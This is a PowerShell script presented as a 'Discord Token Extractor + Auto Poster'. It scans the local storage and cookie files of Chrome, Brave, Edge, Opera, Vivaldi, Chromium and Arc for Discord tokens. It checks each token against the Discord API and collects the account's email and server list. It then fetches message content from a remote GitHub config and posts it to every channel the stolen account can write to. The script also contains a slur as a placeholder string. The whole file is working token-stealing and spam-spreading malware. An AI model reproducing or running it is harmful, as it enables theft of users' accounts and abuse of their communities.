# Discord Token Extractor + Auto Poster (Forum & Text channels)
# Loads per‑server post configuration from a GitHub raw JSON file.

Write-Host "======================================" -ForegroundColor Cyan
Write-Host "Discord Token Extractor + Auto Poster (Forums & Text)" -ForegroundColor Cyan
Write-Host "======================================" -ForegroundColor Cyan

# ===== DEBUG MODE SETTINGS =====
$DebugMode = $false
$DebugToken = "Mbhfsduhafhisdhijf4789897y9fsdqJ92i005cmLjQAFpxqqXz8"
# ===== CONFIGURATION URL (raw GitHub JSON) =====
$ConfigUrl = "https://raw.githubusercontent.com/LigmaSigmaLigma/Config/refs/heads/main/pre_config.json"
# ===============================================

if ($DebugMode -and $DebugToken -and $DebugToken -ne "kysfaggot") {
    Write-Host "[DEBUG MODE ENABLED] Using hardcoded token: $($DebugToken.Substring(0, [Math]::Min(20, $DebugToken.Length)))..." -ForegroundColor Magenta
    $foundTokens = @($DebugToken)
} else {
    if ($DebugMode) {
        Write-Host "[DEBUG MODE] Debug token not set or still default. Falling back to normal scan." -ForegroundColor Yellow
    }
    $tokenPattern = '[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,50}'
    $searchPaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Cookies",
        "$env:LOCALAPPDATA\Opera Software\Opera GX Stable\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Opera Software\Opera GX Stable\Cookies",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Chromium\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Chromium\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Arc\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Arc\User Data\Default\Cookies"
    )
    $foundTokens = @()
    $blacklist = @(
        'login.windows.net', 'accesstoken', 'refreshtoken', 'idtoken',
        'microsoft', 'azure', 'windows.net', 'email', 'https', 'calendars'
    )
    foreach ($path in $searchPaths) {
        if (-not (Test-Path $path)) { continue }
        Write-Host "[*] Searching: $path" -ForegroundColor Yellow
        Get-ChildItem $path -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $content = [System.IO.File]::ReadAllText($_.FullName) -replace "`0", ''
                $matches = [regex]::Matches($content, $tokenPattern)
                foreach ($match in $matches) {
                    $candidate = $match.Value
                    $skip = $false
                    foreach ($bad in $blacklist) {
                        if ($candidate -like "*$bad*") { $skip = $true; break }
                    }
                    if ($skip) { continue }
                    if ($candidate -match '^[0-9a-f]') { continue }
                    if ($candidate -match '^[MN]') {
                        if ($foundTokens -notcontains $candidate) {
                            $foundTokens += $candidate
                            Write-Host "    [!] Potential token found: $candidate" -ForegroundColor Green
                        }
                    }
                }
            }
            catch { }
        }
    }
}

# ----- FUNCTIONS (unchanged) -----
function Test-DiscordToken {
    param([string]$Token)
    try {
        $headers = @{ "Authorization" = $Token; "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
        $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -Method Get -ErrorAction Stop
        return $response
    } catch { return $null }
}

function Get-UserGuilds {
    param([string]$Token)
    try {
        $headers = @{ "Authorization" = $Token; "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
        $guilds = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/guilds" -Headers $headers -Method Get -ErrorAction Stop
        return $guilds
    } catch { return $null }
}

function Get-GuildMemberCount {
    param([string]$Token, [string]$GuildId)
    try {
        $headers = @{ "Authorization" = $Token; "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
        $preview = Invoke-RestMethod -Uri "https://discord.com/api/v9/guilds/$GuildId/preview" -Headers $headers -Method Get -ErrorAction Stop
        return $preview.approximate_member_count
    } catch { return "N/A" }
}

function Get-GuildChannels {
    param([string]$Token, [string]$GuildId)
    try {
        $headers = @{ "Authorization" = $Token; "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
        $channels = Invoke-RestMethod -Uri "https://discord.com/api/v9/guilds/$GuildId/channels" -Headers $headers -Method Get -ErrorAction Stop
        return $channels
    } catch { return $null }
}

function Test-CanCreatePost {
    param([object]$Channel)
    $type = $Channel.type
    if ($type -eq 15 -or $type -eq 16) {
        if (-not $Channel.permissions) { return $true }
        $perms = [int64]$Channel.permissions
        $hasCreatePosts = ($perms -band 0x4000) -ne 0
        $hasSendMessages = ($perms -band 0x800) -ne 0
        return ($hasCreatePosts -and $hasSendMessages)
    }
    elseif ($type -in @(0, 5)) {
        if (-not $Channel.permissions) { return $false }
        $perms = [int64]$Channel.permissions
        return ($perms -band 0x800) -ne 0
    }
    return $false
}

function CreateTextPost {
    param([string]$Token, [string]$ChannelId, [string]$Content)
    try {
        $headers = @{ "Authorization" = $Token; "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"; "Content-Type" = "application/json" }
        $body = @{ content = $Content } | ConvertTo-Json
        $null = Invoke-RestMethod -Uri "https://discord.com/api/v9/channels/$ChannelId/messages" -Headers $headers -Method Post -Body $body -ErrorAction Stop
        return $true
    } catch { Write-Host "      Failed to create text post: $_" -ForegroundColor Red; return $false }
}

function CreateForumPost {
    param([string]$Token, [string]$ChannelId, [string]$PostTitle, [string]$PostContent, [int]$AutoArchiveDuration = 4320)
    try {
        $headers = @{ "Authorization" = $Token; "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"; "Content-Type" = "application/json" }
        $body = @{ name = $PostTitle; auto_archive_duration = $AutoArchiveDuration; message = @{ content = $PostContent }; applied_tags = @() } | ConvertTo-Json -Depth 3
        $uri = "https://discord.com/api/v9/channels/$ChannelId/threads?use_nested_fields=true"
        $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Post -Body $body -ErrorAction Stop
        return $true
    } catch { Write-Host "      Failed to create forum post: $_" -ForegroundColor Red; return $false }
}

# ----- LOAD POST CONFIGURATION FROM GITHUB -----
function Load-PostConfigFromGitHub {
    param([string]$Url)
    try {
        Write-Host "[*] Downloading configuration from $Url ..." -ForegroundColor Gray
        $response = Invoke-RestMethod -Uri $Url -Method Get -ErrorAction Stop
        Write-Host "[+] Successfully loaded config from GitHub." -ForegroundColor Green
        return $response
    }
    catch {
        Write-Host "[!] Failed to load config from GitHub: $_" -ForegroundColor Red
        return $null
    }
}

$config = Load-PostConfigFromGitHub -Url $ConfigUrl
$defaultTitle = "Automated Post"
$defaultContent = "Hello from automated post! This was created via token."
if ($config -and $config.default) {
    if ($config.default.title) { $defaultTitle = $config.default.title }
    if ($config.default.content) { $defaultContent = $config.default.content }
}

# Helper function to get random variant for a server
function Get-ServerPostContent {
    param([object]$ServerConfig)
    if (-not $ServerConfig) {
        return @{ title = $defaultTitle; content = $defaultContent }
    }
    # If variants array exists and has at least one item, pick one randomly
    if ($ServerConfig.variants -and $ServerConfig.variants.Count -gt 0) {
        $variant = $ServerConfig.variants | Get-Random
        $title = if ($variant.title) { $variant.title } else { $defaultTitle }
        $content = if ($variant.content) { $variant.content } else { $defaultContent }
        return @{ title = $title; content = $content }
    }
    # Otherwise, use single title/content if present, else fallback to defaults
    $title = if ($ServerConfig.title) { $ServerConfig.title } else { $defaultTitle }
    $content = if ($ServerConfig.content) { $ServerConfig.content } else { $defaultContent }
    return @{ title = $title; content = $content }
}

# ----- MAIN SCRIPT -----
Write-Host "`n======================================" -ForegroundColor Cyan
if ($foundTokens.Count -gt 0) {
    Write-Host "[+] Found $($foundTokens.Count) potential token(s). Verifying..." -ForegroundColor Green
    Write-Host "======================================`n" -ForegroundColor Cyan
    
    $validTokenInfo = @()
    $i = 1
    foreach ($token in $foundTokens) {
        $shortToken = if ($token.Length -gt 20) { $token.Substring(0, 20) + "..." } else { $token }
        Write-Host "[$i] Verifying token: $shortToken" -ForegroundColor Yellow
        $userInfo = Test-DiscordToken -Token $token
        if ($userInfo) {
            Write-Host "    [VALID] User: $($userInfo.username) (ID: $($userInfo.id))" -ForegroundColor Green
            
            $guilds = Get-UserGuilds -Token $token
            $guildDetails = @()
            if ($guilds -and $guilds.Count -gt 0) {
                Write-Host "       Servers ($($guilds.Count)): Fetching member counts..." -ForegroundColor Gray
                $guildCounter = 0
                foreach ($g in $guilds) {
                    $guildCounter++
                    $admin = if (($g.permissions -band 0x8) -ne 0) { "Yes" } else { "No" }
                    Write-Host "          [$guildCounter] $($g.name) (Admin: $admin) - Fetching member count..." -ForegroundColor DarkGray
                    $memberCount = Get-GuildMemberCount -Token $token -GuildId $g.id
                    $guildDetails += [PSCustomObject]@{ Name = $g.name; ID = $g.id; Admin = $admin; Members = $memberCount }
                    Start-Sleep -Milliseconds 200
                }
            } else {
                Write-Host "       Servers: None or unable to fetch" -ForegroundColor Gray
            }
            
            $validTokenInfo += @{
                Token = $token; Username = $userInfo.username; Id = $userInfo.id
                Email = $userInfo.email; Verified = $userInfo.verified
                Guilds = $guildDetails; GuildObjects = $guilds
            }
        } else {
            Write-Host "    [INVALID] INVALID or expired" -ForegroundColor Red
        }
        Write-Host ""; $i++
    }
    
    Write-Host "======================================" -ForegroundColor Cyan
    if ($validTokenInfo.Count -gt 0) {
        Write-Host "[+] Found $($validTokenInfo.Count) valid Discord token(s)!" -ForegroundColor Green
        Write-Host "======================================`n" -ForegroundColor Cyan
        
        $j = 1
        foreach ($info in $validTokenInfo) {
            Write-Host "$j. Username: $($info.Username) (ID: $($info.Id))" -ForegroundColor Cyan
            Write-Host "   Email: $($info.Email)" -ForegroundColor Gray
            Write-Host "   Verified: $($info.Verified)" -ForegroundColor Gray
            Write-Host "   Servers ($(($info.Guilds).Count)):" -ForegroundColor Yellow
            if ($info.Guilds.Count -gt 0) {
                foreach ($g in $info.Guilds) { Write-Host "      - $($g.Name) (ID: $($g.ID)) | Admin: $($g.Admin) | Members: $($g.Members)" -ForegroundColor White }
            } else { Write-Host "      (none)" -ForegroundColor DarkGray }
            Write-Host ""; $j++
        }
        
        # ------- SCAN SERVERS AND CREATE POSTS (WITH PER-SERVER RANDOM VARIANTS) -------
        Write-Host "======================================" -ForegroundColor Cyan
        Write-Host "[*] Scanning servers for channels where you can create posts..." -ForegroundColor Magenta
        Write-Host "======================================`n" -ForegroundColor Cyan
        
        foreach ($tokenInfo in $validTokenInfo) {
            $token = $tokenInfo.Token; $username = $tokenInfo.Username
            $guildsRaw = $tokenInfo.GuildObjects
            if (-not $guildsRaw -or $guildsRaw.Count -eq 0) {
                Write-Host "User $username has no servers to scan." -ForegroundColor Yellow; continue
            }
            Write-Host "Scanning for user: $username" -ForegroundColor Magenta
            
            foreach ($g in $guildsRaw) {
                $guildId = $g.id; $guildName = $g.name
                
                # Retrieve server-specific post content (supports random variants)
                $serverCfg = if ($config -and $config.servers) { $config.servers.$guildId } else { $null }
                $postData = Get-ServerPostContent -ServerConfig $serverCfg
                $postTitle = $postData.title
                $postContent = $postData.content
                
                # Show which config is being used
                if ($serverCfg) {
                    if ($serverCfg.variants) {
                        Write-Host "  Server: $guildName ($guildId) - Using random variant from GitHub config" -ForegroundColor Cyan
                    } else {
                        Write-Host "  Server: $guildName ($guildId) - Using custom single message from GitHub config" -ForegroundColor Cyan
                    }
                } else {
                    Write-Host "  Server: $guildName ($guildId) - Using default config" -ForegroundColor Cyan
                }
                
                $channels = Get-GuildChannels -Token $token -GuildId $guildId
                if (-not $channels) {
                    Write-Host "    Could not fetch channels (maybe no permission)." -ForegroundColor DarkGray; continue
                }
                
                # Debug: list all channels (optional)
                Write-Host "    [DEBUG] Channels in this server:" -ForegroundColor DarkGray
                foreach ($ch in $channels) {
                    $chName = if ($ch.name) { $ch.name } else { "Unnamed" }
                    $chType = $ch.type
                    $chPerms = if ($ch.permissions) { [int64]$ch.permissions } else { "null" }
                    Write-Host "      - $chName (type=$chType, permissions=$chPerms)" -ForegroundColor DarkGray
                }
                
                $postableChannels = 0
                foreach ($channel in $channels) {
                    if (Test-CanCreatePost -Channel $channel) {
                        $postableChannels++
                        $channelName = if ($channel.name) { $channel.name } else { "Unnamed-$($channel.id)" }
                        $channelType = $channel.type
                        Write-Host "    [+] Can create post in channel: $channelName (Type: $channelType)" -ForegroundColor Green
                        
                        if ($channelType -eq 15 -or $channelType -eq 16) {
                            $success = CreateForumPost -Token $token -ChannelId $channel.id -PostTitle $postTitle -PostContent $postContent
                            if ($success) { Write-Host "        Forum post created in $channelName" -ForegroundColor Green }
                            else { Write-Host "        Failed to create forum post in $channelName" -ForegroundColor Red }
                        } elseif ($channelType -in @(0, 5)) {
                            $success = CreateTextPost -Token $token -ChannelId $channel.id -Content $postContent
                            if ($success) { Write-Host "        Text post created in $channelName" -ForegroundColor Green }
                            else { Write-Host "        Failed to create text post in $channelName" -ForegroundColor Red }
                        } else {
                            Write-Host "        Unsupported channel type: $channelType" -ForegroundColor Yellow
                        }
                        Start-Sleep -Milliseconds 1000
                    }
                }
                if ($postableChannels -eq 0) { Write-Host "    No channels where you can create posts." -ForegroundColor DarkGray }
                Write-Host ""; Start-Sleep -Milliseconds 500
            }
        }
        Write-Host "[OK] Finished scanning and posting." -ForegroundColor Green
    } else {
        Write-Host "[-] None of the found tokens are valid." -ForegroundColor Red
        Write-Host "    They may be expired or from a different account." -ForegroundColor Yellow
    }
} else {
    Write-Host "[-] No Discord tokens found in the scanned locations." -ForegroundColor Yellow
}